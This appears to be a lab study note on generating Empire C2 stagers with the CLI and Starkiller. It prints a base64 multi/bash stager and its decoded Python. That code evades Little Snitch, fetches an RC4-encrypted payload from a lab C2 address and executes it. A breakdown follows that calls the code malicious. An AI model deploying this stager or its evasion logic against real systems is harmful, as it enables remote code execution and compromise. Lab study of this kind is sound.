Stagers are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed.  

We can generate stagers in either Empire CLI or Starkiller. In most cases these will be given as script files to be uploaded to the target and executed. Empire gives us a huge range of options for creating and obfuscating stagers for AV evasion; however, we will not be going into a lot of detail about these here.

---
## Empire client

Let's first look at generating stagers in the Empire CLI application.

From the main Empire prompt, type `usestager`  (including the space!)  to get a list of available stagers in a dropdown menu.  

There are a variety of options here. When in doubt, `multi/launcher` is often a good bet. In this case, let's go for `multi/bash` (`usestager multi/bash`):

![[Empire - Stagers-20250102134632130.webp]]

As with listeners, we set options with `set OPTION VALUE`. There are many options here, but the only thing we need do is set the listener to the name of the listener we created in the previous task, then tell Empire to `execute`, creating the stager in our `/tmp` directory:

![[Empire - Stagers-20250102134733452.webp]]

We now need to get the stager to the target and executed, but that is a job for later on. In the meantime we can save the stager into a file on our own attacking machine then once again exit out of the stager menu with `back`.

---
## Starkiller

Not unexpectedly, the process for generating stagers with Starkiller is almost identical.  

First we switch over to the Stagers menu on the left hand side of the interface:

![[Empire - Stagers-20250102134839790.webp]]

From here we click "Create" and once again select `multi/bash`.  

We select the Listener we created in the previous task, then click submit, leaving the other options at their default values:

![[Empire - Stagers-20250102134914794.webp]]

This brings us back to the stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the "Actions" dropdown and selecting "Copy to Clipboard":

![[Empire - Stagers-20250102134954941.webp]]

Once again we would now have to execute this on the target.

> [!Question]
> **Bonus Question (Optional):** Read through the code in the script and see if you can decipher what it is doing. You will need to decode the payload from Base64 before doing so.


1. Paste the clipboard on a text editor.
2. Get the following part of the code:
```
aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC41MC44NS4zMzo5MDAwJzt0PScvYWRtaW4vZ2V0LnBocCc7CnJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249UGVnWkU1QmRLckdTOHJIaUgzU1dQTFpTbFVZPSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdOwpkYXRhPWFbNDpdOwprZXk9SVYrJ1M4T0Yrdz9AdVZibVg9a2opfDVuZEQzY0xIO282ZUU6Jy5lbmNvZGUoJ1VURi04Jyk7ClMsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdOwpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKaT1qPTA7CmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NjsKICAgIGo9KGorU1tpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSk7CmV4ZWMoJycuam9pbihvdXQpKTs=
```

2. Decode base64 online or on your machine.
```
import sys;
import re, subprocess;
cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = ps.communicate();
if re.search("Little Snitch", out.decode('UTF-8')):
   sys.exit();

import urllib.request;
UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://10.50.85.33:9000';t='/admin/get.php';
req=urllib.request.Request(server+t);
proxy = urllib.request.ProxyHandler();
o = urllib.request.build_opener(proxy);
o.addheaders=[('User-Agent',UA), ("Cookie", "session=PegZE5BdKrGS8rHiH3SWPLZSlUY=")];
urllib.request.install_opener(o);
a=urllib.request.urlopen(req).read();
IV=a[0:4];
data=a[4:];
key=IV+'S8OF+w?@uVbmX=kj)|5ndD3cLH;o6eE:'.encode('UTF-8');
S,j,out=list(range(256)),0,[];
for i in list(range(256)):
    j=(j+S[i]+key[i%len(key)])%256;
    S[i],S[j]=S[j],S[i];
i=j=0;
for char in data:
    i=(i+1)%256;
    j=(j+S[i])%256;
    S[i],S[j]=S[j],S[i];
    out.append(chr(char^S[(S[i]+S[j])%256]));
exec(''.join(out));
```

### Code Summary:

1. **Check for Little Snitch**:
    
    - The code executes the command `ps -ef | grep Little\ Snitch | grep -v grep` to check if "Little Snitch" (a macOS firewall application) is running.
    - If Little Snitch is detected, the script exits immediately (`sys.exit()`), preventing further execution.
2. **Setup HTTP Request**:
    
    - Sets up a user-agent string to mimic a legitimate browser (`Mozilla/5.0`).
    - Defines a server URL (`http://10.50.85.33:9000`) and a specific endpoint (`/admin/get.php`).
    - Sends an HTTP GET request to this endpoint with a specific cookie (`session=PegZE5BdKrGS8rHiH3SWPLZSlUY=`).
3. **Retrieve and Process Data**:
    
    - Retrieves the response from the server and splits it:
        - The first 4 bytes are used as an Initialization Vector (IV).
        - The rest is treated as encrypted data.
    - Generates an encryption key using the IV and a hardcoded string.
4. **RC4-like Decryption**:
    
    - Implements a simplified version of the RC4 encryption algorithm to decrypt the server response using the generated key.
5. **Execute Decrypted Code**:
    
    - Decrypts the data into a Python script.
    - Uses the `exec()` function to execute the decrypted code dynamically.

---

### Key Observations:

- **Potentially Malicious**: The code appears to be malicious:
    
    - Detecting and avoiding Little Snitch indicates an attempt to evade monitoring.
    - Fetching and executing remote code dynamically without validation is a significant security risk.
- **Dynamic Behavior**: The actual payload or purpose of the script depends on what the remote server (`http://10.50.85.33:9000/admin/get.php`) returns.

**Next step: ** [[Empire - Agents]]
